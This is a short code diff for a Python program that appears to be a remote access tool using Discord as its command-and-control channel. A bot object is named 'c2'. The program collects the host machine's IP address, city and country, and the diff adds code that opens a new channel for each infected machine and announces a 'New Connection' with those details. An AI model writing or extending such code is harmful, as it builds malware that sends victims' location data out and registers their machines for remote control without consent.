@@ -1,11 +1,13 @@
 import discord
 from discord.ext import commands
+from discord.ext.commands import bot
 from dotenv import load_dotenv
-from func import *
+from src.func import *
 import threading
 import os as osVars
 import os.path as osp
 import platform
+from src.setup import *
 
 # The main DiscordBot class, contains all relevant functions and params
 class DiscordBot:
@@ -13,7 +15,7 @@ class DiscordBot:
     load_dotenv()
     bot = commands.Bot(command_prefix="!")
     ip = get_ip()
-
+    identifier = sanity()
     # Guild, Bot Token input
     channel_id = int(osVars.environ.get("DISCORD_CHANNEL_ID")) # should be in int type!
     token = osVars.environ.get("DISCORD_TOKEN") # should be in string type!
@@ -22,11 +24,15 @@ class DiscordBot:
     country, city = get_location(ip)
 
     threads = []
-    
 
     @bot.event
     async def on_ready():
-        c2 = bot.get_channel(channel_id)
+        guild = bot.get_guild(int(osVars.environ.get("DISCORD_GUILD_ID")))
+        channel_name = await guild.create_text_channel(identifier)
+        print(f"Created new channel: {channel_name}")
+        channel_id = discord.utils.get(bot.get_all_channels(), name=identifier)
+        c2 = bot.get_channel(channel_id.id)
+
         await c2.send(f"-------------------------------------------------------"
                       f"\nNew Connection:\n\n"
                       f"{ip}\n"
